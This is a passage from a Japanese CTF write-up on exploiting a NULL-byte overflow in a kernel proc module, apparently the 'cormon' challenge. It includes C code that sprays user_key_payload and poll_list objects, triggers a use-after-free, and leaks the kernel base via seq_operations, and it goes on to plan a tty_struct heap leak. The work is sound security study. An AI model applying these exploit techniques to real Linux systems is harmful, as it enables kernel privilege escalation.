&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">key_get_type_from_user&lt;/span>(type, _type, &lt;span style="color:#66d9ef">sizeof&lt;/span>(type));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> description &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_description) {...}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* pull the payload in if one was supplied */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (plen) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">copy_from_user&lt;/span>(payload, _payload, plen) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> error3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> keyring_ref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">lookup_user_key&lt;/span>(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> key_ref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">key_create_or_update&lt;/span>(keyring_ref, type, description,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// security/keys/key.c
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">key_ref_t&lt;/span> &lt;span style="color:#a6e22e">key_create_or_update&lt;/span>(&lt;span style="color:#66d9ef">key_ref_t&lt;/span> keyring_ref,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>type,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>description,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>payload,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">size_t&lt;/span> plen,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">key_perm_t&lt;/span> perm,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> flags)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> keyring_index_key index_key &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .description &lt;span style="color:#f92672">=&lt;/span> description,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> };
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> key_preparsed_payload prep;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index_key.type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">key_type_lookup&lt;/span>(type);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>prep, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(prep));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (index_key.type&lt;span style="color:#f92672">-&amp;gt;&lt;/span>preparse) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> index_key.type&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">preparse&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>prep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">__key_instantiate_and_link&lt;/span>(key, &lt;span style="color:#f92672">&amp;amp;&lt;/span>prep, keyring, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>edit);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>はい。&lt;a href="https://man7.org/linux/man-pages/man2/add_key.2.html">manpage&lt;/a>によると、&lt;code>keyring&lt;/code>, &lt;code>user&lt;/code>, &lt;code>logon&lt;/code>, &lt;code>bigkey&lt;/code>という4種類の鍵があります。そしてそのそれぞれについてfopsみたいな&lt;code>struct key_type&lt;/code>構造体が結びついています。このハンドラの中の、ユーザ入力ペイロードをパースする関数である&lt;code>.preparse&lt;/code>は、&lt;code>user&lt;/code>タイプの場合&lt;code>user_preparse()&lt;/code>関数に成っています。&lt;code>user_preparse()&lt;/code>は、&lt;code>user_key_payload&lt;/code>構造体を&lt;code>kmalloc&lt;/code>します。この構造体はこれまた可変サイズを持ち、最大&lt;code>sizeof(struct user_key_payload) + 32767&lt;/code>までの任意のサイズをユーザ指定で確保することができます。解放も、ユーザが任意のタイミングで行うことができます(&lt;a href="https://man7.org/linux/man-pages/man3/keyctl_revoke.3.html">&lt;code>keyctl_revoke&lt;/code>&lt;/a>)。&lt;a href="https://man7.org/linux/man-pages/man3/keyctl_read.3.html">読むこと&lt;/a>も、できます。素晴らしい構造体ですね、全くどうやってこんなもんを見つけてくるのやら。おまけに、&lt;strong>特筆すべきこととして最初のメンバである&lt;code>rcu&lt;/code>は初期化されるまではもとの値が保たれるみたいです&lt;/strong>。ふぅ。&lt;/p>
&lt;h2 id="kbase-leak-via-user_key_payload-and-seq_operations">kbase leak via &lt;code>user_key_payload&lt;/code> and &lt;code>seq_operations&lt;/code>&lt;/h2>
&lt;p>さて、これらの材料を使うとkernbaseがリークできそうです。細かい事は無視して大枠だけ考えます。
事前準備として、&lt;code>add_key&lt;/code>を呼び出して&lt;code>struct user_key_payload&lt;/code>を&lt;code>kmalloc-32&lt;/code>に置いておきます。続いて、&lt;code>poll&lt;/code>を542個(stackに置かれる30個 + kmalloc-4kに置かれる510個 + kmalloc-32に置かれる2個)のfdに対して呼び出します。そうすると、&lt;code>stack --&amp;gt; kmalloc-4k --&amp;gt; kmalloc-32&lt;/code>の順に&lt;code>struct poll_list&lt;/code>のリストが繋がれます。続いて、モジュールのプロックファイルに書き込むことで&lt;code>cormon_proc_write()&lt;/code>を呼び出してNULL-byte overflowさせます。このときバッファは&lt;code>kmalloc-4k&lt;/code>にとられるため、うまく行くと先程の&lt;code>poll_list.next&lt;/code>ポインタの最後1byteがpartial overwriteされます。そして、そのアドレスがうまい具合だと、書き換えたあとのポインタが一番最初に準備した&lt;code>user_key_payload&lt;/code>を指すことになります。続いて&lt;code>poll_list&lt;/code>をfreeさせる(これはtimer expireでも、イベントを発生させるのでもどちらでもOK)ことで、リストにつながっている&lt;code>user_key_payload&lt;/code>をfreeします。これで&lt;code>user_key_payload&lt;/code>のUAF完成です。kbaseを読むために&lt;code>seq_operations&lt;/code>らへんを確保して、&lt;code>user_key_payload&lt;/code>の上に配置します。あとは&lt;code>keyctl_read&lt;/code>でペイロードを読むことで、kbaseをleakできます。
というようにシナリオだけ文面で考えると簡単そうですが、「うまくいくと」と書いたところをうまくさせないといけませんね。まぁスプレーでなんとかなるでしょう。
さて、順を追ってやっていきましょう。まずは&lt;code>add_key()&lt;/code>でkmalloc-32に鍵を置きます。なお、&lt;code>add_key&lt;/code> syscallに対するglibc wrapperはないため、&lt;code>libkeyutils-dev&lt;/code>等のパッケージをインストールしたあと、&lt;code>-lkeyutils&lt;/code>を指定してビルドする必要があります。
雑にkeyをスプレーします:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-spray_keys.c" data-lang="spray_keys.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">spray_keys&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>desc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">calloc&lt;/span>(&lt;span style="color:#ae81ff">0x100&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (desc &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;spray_keys malloc&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strcpy&lt;/span>(desc, DESC_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memcpy&lt;/span>(desc &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">strlen&lt;/span>(DESC_KEY_TOBE_OVERWRITTEN_SEQOPS), &lt;span style="color:#f92672">&amp;amp;&lt;/span>ix, &lt;span style="color:#ae81ff">4&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>key_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(key_payload, &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">key_serial_t&lt;/span> keyid0 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">add_key&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;user&amp;#34;&lt;/span>, desc, key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, KEY_SPEC_PROCESS_KEYRING);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (keyid0 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;add_key 0&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>すると、以下のようにヒープの中にそれらしい箇所が見つかります(&lt;code>pt -ss AAAAAAAA -align 8 &lt;/code>)。きっとコレが&lt;code>kmalloc-32&lt;/code>でしょう。needleとして仕込んだ&lt;code>AAAAAAAA&lt;/code>というペイロードと、その直前がshortの&lt;code>0x08&lt;/code>(&lt;code>ushort datalen&lt;/code>)であることからもわかります:&lt;/p>
&lt;p>&lt;img src="cj-heap.png" alt="user_key_payload in kmalloc-32">&lt;/p>
&lt;p>ところで、&lt;code>user_key_payload&lt;/code>が連続していないことが見て取れますね。きっと、&lt;code>CONFIG_SLAB_FREELIST_RANDOMIZE&lt;/code>らへんが有効化されているのでしょう。
続いて、&lt;code>poll_list&lt;/code>を&lt;code>kmalloc-4k&lt;/code>と&lt;code>kmalloc-32&lt;/code>にスプレーしていきます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-alloc_poll_list.c" data-lang="alloc_poll_list.c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_POLLLIST_ALLOC; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">pthread_create&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>threads[ix], NULL, alloc_poll_list, &lt;span style="color:#f92672">&amp;amp;&lt;/span>just_fd) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;pthread_create&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="search-polllist.png" alt="search for poll_list">&lt;/p>
&lt;p>&lt;img src="./polllist-4k.png" alt="poll_list in kmalloc-4k">&lt;/p>
&lt;p>今回はpollするイベントは&lt;code>POLLERR&lt;/code>(&lt;code>=0x0008&lt;/code>)で、使った&lt;code>fd&lt;/code>は&lt;code>0x00000004&lt;/code>なので、バイト列&lt;code>0x0000000400080000&lt;/code>をニードルとして検索できます(&lt;code>pt -sb 08000000040000000800000004000000 -align 16&lt;/code>。まぁ、&lt;code>pt -sb fe01000004000000 -align 8&lt;/code>のほうが良さそう)。ところで、&lt;code>struct poll_list&lt;/code>において、&lt;code>struct pollfd[]&lt;/code>って8byteアラインされないんですね。おかげで&lt;code>poll_list&lt;/code>がどこにも見つからない&amp;hellip;!と発狂する羽目になりました。あ、ところでこの&lt;code>pt&lt;/code>コマンドは&lt;a href="https://github.com/martinradev/gdb-pt-dump">gdb-pt-dump&lt;/a>のことです。&lt;/p>
&lt;p>&lt;img src="./pahole-pollfd.png" alt="pahole of pollfd">&lt;/p>
&lt;p>&lt;img src="./pahole-polllist.png" alt="pahole of poll_list">&lt;/p>
&lt;p>さぁさぁ、とりあえずは各構造体が意図したサイズのキャッシュに入っていることが分かりました。
この状態で、一旦NULL-byte overflowさせてみます:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-overflow.c" data-lang="overflow.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">nullbyte_overflow&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(cormon_fd &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(cormon_buf, &lt;span style="color:#e6db74">&amp;#39;B&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strcpy&lt;/span>((&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)cormon_buf &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;THIS_IS_CORMON_BUFFER&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>cormon_buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">write&lt;/span>(cormon_fd, cormon_buf, &lt;span style="color:#ae81ff">0x1000&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;nullbyte_overflow&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="./search-polllist.png" alt="search for NULL-overflowed poll_list">&lt;/p>
&lt;p>うーん、確かに次のページ上のスラブオブジェクトがNULL-byte overflowされている感じはしますが、このオブジェクトは明らかに&lt;code>struct poll_list&lt;/code>ではありません(&lt;code>.len&lt;/code>メンバが不正)。色々と試してみた結果、&lt;code>struct poll_list&lt;/code>を確保する回数を&lt;code>0x10 -&amp;gt; 0x10-2&lt;/code>回にしたらいい感じになりました。スプレーでは大事、こういう小さい調整:&lt;/p>
&lt;p>&lt;img src="./nullof.png" alt="actually, poll_list is NULL-byte overflowed!">&lt;/p>
&lt;p>確かに&lt;code>cormon_proc_write()&lt;/code>で確保されたバッファと&lt;code>struct poll_list&lt;/code>が隣接し、&lt;code>poll_list.next&lt;/code>の先頭1byteがNULL-byte overflowされていることがわかりますね。因みに、writeupによると&lt;code>sched_setaffinity()&lt;/code>を使ってどのコアを使うかをコントロールしたほうがいいらしいです。確かにスラブキャッシュはPERCPUだから、そっちのほうが良さそう。頭いいね！
さぁ、ここで重要なことは、overwriteされた&lt;code>next&lt;/code>ポインタが指す先(&lt;code>0xffff888007617500&lt;/code>)が最初に確保した&lt;code>user_key_payload&lt;/code>になっているかどうか。且つ、最初のメンバである&lt;code>user_key_payload.rcu&lt;/code>がNULLであるかどうかですが&amp;hellip;:&lt;/p>
&lt;p>&lt;img src="./key-polllist.png" alt="user_key_payload is pointed to by poll_list.next">&lt;/p>
&lt;p>完璧ですね。これであとは数秒待って&lt;code>poll&lt;/code>をタイムアウトさせることで、&lt;code>poll_list&lt;/code>が先頭から順にfreeされていきます。&lt;code>user_key_payload&lt;/code>もfreeされてしまいます。よって、こいつの上に新しく何らかの構造体を置いてあげましょう。&lt;code>kmalloc-32&lt;/code>に入っていて、且つkptrを含んでいるものなら何でもいいです。今回は&lt;code>seq_operations&lt;/code>を使ってみます:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-seq_operations.c" data-lang="seq_operations.c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check all keys to leak kbase via `seq_operations`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> keybuf[&lt;span style="color:#ae81ff">0x100&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong leaked &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(keybuf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x100&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">keyctl_read&lt;/span>(keys[ix], keybuf, &lt;span style="color:#ae81ff">0x100&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_read&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strncmp&lt;/span>(keybuf, &lt;span style="color:#e6db74">&amp;#34;AAAA&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> leaked &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong&lt;span style="color:#f92672">*&lt;/span>)keybuf;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (leaked &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[-] Failed to leak kbase&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exit&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] leaked: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, leaked);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="./panic.png" alt="panic, but leak fails">&lt;/p>
&lt;p>う〜〜〜ん、panicしているので確実に悪いことはできているのですが上手くleakはできていません。gdbで見てみましょう:&lt;/p>
&lt;p>&lt;img src="./dbg1.png" alt="the former is overflowed poll_list, the latter is user_key_payload as seq_operations">&lt;/p>
&lt;p>前半がoverflowされた&lt;code>poll_list&lt;/code>、後半が&lt;code>poll_list.next&lt;/code>に指されたためにfreeされて&lt;code>user_key_payload&lt;/code>から&lt;code>seq_operations&lt;/code>になったもの。う〜ん、一見すると良さそうですけどね。とりあえず一番最初にもっと&lt;code>kmalloc-32&lt;/code>を飽和させておいたほうがいいんじゃないかと思い、&lt;code>user_key_payload&lt;/code>をもっとスプレーしようとしたところ、以下のエラーになりました:&lt;/p>
&lt;p>&lt;img src="./disk-quota.png" alt="Disk quota exceeded">&lt;/p>
&lt;p>詳しくは見ていないけど、鍵はあんまり多くは確保できなさそうなので代わりに&lt;code>seq_operations&lt;/code>でもっとスプレーしておくようにしました。それから、&lt;code>pthread_join()&lt;/code>する度にすぐさま&lt;code>seq_operations&lt;/code>を確保するようにしました。しかしながら、やっぱり&lt;code>keyctl_read()&lt;/code>でleakできない！！&lt;/p>
&lt;p>&lt;img src="./spray.png" alt="somehow, kernel pointer cannot be leaked&amp;amp;hellip;">&lt;/p>
&lt;p>しばらく悩んだあと&lt;code>keyctl_read&lt;/code>のmanpageを呼んでみると以下の記述が:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-keyctl_read.man" data-lang="keyctl_read.man">&lt;span style="display:flex;">&lt;span>RETURN VALUE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> On success keyctl_read() returns the amount of data placed into the buffer. If the buffer was too small, then the size of
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buffer required will be returned, and the contents of the buffer may have been overwritten in some undefined way.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>あ、バッファサイズが小さい場合には、undefinedな動作が起こるらしい&amp;hellip;。ということで、&lt;code>keyctl_read()&lt;/code>に渡すバッファサイズを十分大きく(&amp;gt;=0x4330)してもう一度やってみると:&lt;/p>
&lt;p>&lt;img src="./lgtm.png" alt="kbase leak success after extending buf size!">&lt;/p>
&lt;p>よさそう！&lt;/p>
&lt;h2 id="leak-kheap-via-tty_struct--tty_file_private">leak kheap via &lt;code>tty_struct&lt;/code> / &lt;code>tty_file_private&lt;/code>&lt;/h2>
&lt;p>kbase leakができました。さて、どうしよう。一瞬このまま&lt;code>user_key_payload&lt;/code>であり且つ&lt;code>seq_operations&lt;/code>でもあるオブジェクトを&lt;code>user_key_payload&lt;/code>としてkfreeし、&lt;code>setxattr&lt;/code>を使って&lt;code>seq_operations&lt;/code>内のポインタを書き換えてやればRIPが取れるじゃんと思いましたが、KPTIがある都合上stack pivotする必要があり、&lt;strong>heapのアドレスが必要&lt;/strong>であることに気が付きました。
とりあえずはheapのアドレスが欲しい。幸いにも、kbaseのleakに使った&lt;code>user_key_payload&lt;/code>だったオブジェクトは、上に乗っている&lt;code>seq_operations&lt;/code>を解放して他のオブジェクトにしてやることで再度leakをすることができます。というわけで、&lt;code>tty_struct&lt;/code>を使いましょう。&lt;code>/dev/ptmx&lt;/code>を開くと以下のパスに到達します:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-drivers/tty/pty.c" data-lang="drivers/tty/pty.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> tty_file_private {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> tty_struct &lt;span style="color:#f92672">*&lt;/span>tty;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>file;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> list_head list;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
